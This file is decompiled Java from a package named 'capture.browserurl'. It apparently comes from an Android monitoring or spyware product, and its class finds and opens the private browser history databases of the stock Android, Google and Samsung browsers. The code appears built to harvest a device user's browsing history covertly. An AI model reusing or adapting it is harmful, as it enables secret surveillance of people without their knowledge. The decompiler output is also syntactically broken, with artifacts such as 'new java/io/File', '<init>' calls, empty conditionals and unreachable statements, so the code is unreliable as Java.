package com.vvt.capture.browserurl.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.io.d;
import java.io.File;

public class b
{
  public static final File[] a;
  private static final boolean b = a.a;
  private static final boolean c = a.e;
  private static String d = null;
  
  static
  {
    File[] arrayOfFile = new File[3];
    File localFile = new java/io/File;
    localFile.<init>("/data/data/com.android.browser/databases/");
    arrayOfFile[0] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/dbdata/databases/com.android.browser/");
    arrayOfFile[1] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/data/data/com.google.android.browser/databases/");
    arrayOfFile[2] = localFile;
    a = arrayOfFile;
  }
  
  public static SQLiteDatabase a()
  {
    return a(17);
  }
  
  private static SQLiteDatabase a(int paramInt)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = d;
    Object localObject3;
    if (localObject1 == null)
    {
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = a;
      localObject3 = "browser";
      String str = "db";
      k = d.a((File[])localObject2, (String)localObject3, (StringBuilder)localObject1, str);
      if (k == 0) {
        break label128;
      }
      localObject1 = ((StringBuilder)localObject1).toString();
      d = (String)localObject1;
      bool1 = b;
      if (!bool1) {}
    }
    Object localObject2 = b(paramInt);
    int i = 5;
    localObject1 = localObject2;
    int k = i;
    while ((localObject1 == null) && (k > 0))
    {
      boolean bool2 = b;
      if (bool2) {}
      long l = 1000L;
      SystemClock.sleep(l);
      localObject3 = b(paramInt);
      int j = k + -1;
      k = j;
      localObject1 = localObject3;
    }
    label128:
    boolean bool3 = c;
    if (bool3) {}
    bool3 = false;
    localObject1 = null;
    for (;;)
    {
      return (SQLiteDatabase)localObject1;
      boolean bool4 = b;
      if (!bool4) {}
    }
  }
  
  public static SQLiteDatabase a(String paramString)
  {
    Object localObject;
    if (paramString == null)
    {
      boolean bool1 = b;
      if (bool1) {}
      bool1 = false;
      localObject = null;
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      int k = 17;
      SQLiteDatabase localSQLiteDatabase1 = a(paramString, k);
      int i = 5;
      localObject = localSQLiteDatabase1;
      int m = i;
      while ((localObject == null) && (m > 0))
      {
        boolean bool2 = b;
        if (bool2) {}
        long l = 1000L;
        SystemClock.sleep(l);
        SQLiteDatabase localSQLiteDatabase2 = a(paramString, k);
        int j = m + -1;
        m = j;
        localObject = localSQLiteDatabase2;
      }
    }
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      File localFile = new java/io/File;
      localFile.<init>(paramString);
      bool = localFile.exists();
      if (!bool) {}
      bool = false;
      localFile = null;
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  public static SQLiteDatabase b()
  {
    return a(16);
  }
  
  private static SQLiteDatabase b(int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      Object localObject = new java/io/File;
      String str = d;
      ((File)localObject).<init>(str);
      boolean bool = ((File)localObject).exists();
      if (!bool) {}
      localObject = d;
      str = null;
      localSQLiteDatabase = SQLiteDatabase.openDatabase((String)localObject, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;) {}
    }
    return localSQLiteDatabase;
  }
  
  public static SQLiteDatabase b(String paramString)
  {
    Object localObject;
    if (paramString == null)
    {
      boolean bool1 = b;
      if (bool1) {}
      bool1 = false;
      localObject = null;
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      int k = 16;
      SQLiteDatabase localSQLiteDatabase1 = a(paramString, k);
      int i = 5;
      localObject = localSQLiteDatabase1;
      int m = i;
      while ((localObject == null) && (m > 0))
      {
        boolean bool2 = b;
        if (bool2) {}
        long l = 1000L;
        SystemClock.sleep(l);
        SQLiteDatabase localSQLiteDatabase2 = a(paramString, k);
        int j = m + -1;
        m = j;
        localObject = localSQLiteDatabase2;
      }
    }
  }
  
  public static boolean c()
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    Object localObject2 = a;
    String str1 = "browser";
    String str2 = "db";
    boolean bool2 = d.a((File[])localObject2, str1, (StringBuilder)localObject1, str2);
    bool1 = false;
    localObject2 = null;
    if (bool2)
    {
      str1 = ((StringBuilder)localObject1).toString();
      if (str1 != null)
      {
        bool1 = b;
        if (bool1) {}
        localObject2 = ((StringBuilder)localObject1).toString().trim().toLowerCase();
        localObject1 = "browser2.db";
        bool1 = ((String)localObject2).endsWith((String)localObject1);
        bool3 = b;
        if (!bool3) {}
      }
    }
    boolean bool3 = b;
    if (bool3) {}
    return bool1;
  }
  
  public static boolean d()
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = false;
    File localFile = new java/io/File;
    String str = "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/History";
    localFile.<init>(str);
    boolean bool2 = localFile.exists();
    if (bool2) {
      bool1 = true;
    }
    bool2 = b;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
    return bool1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/browserurl/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */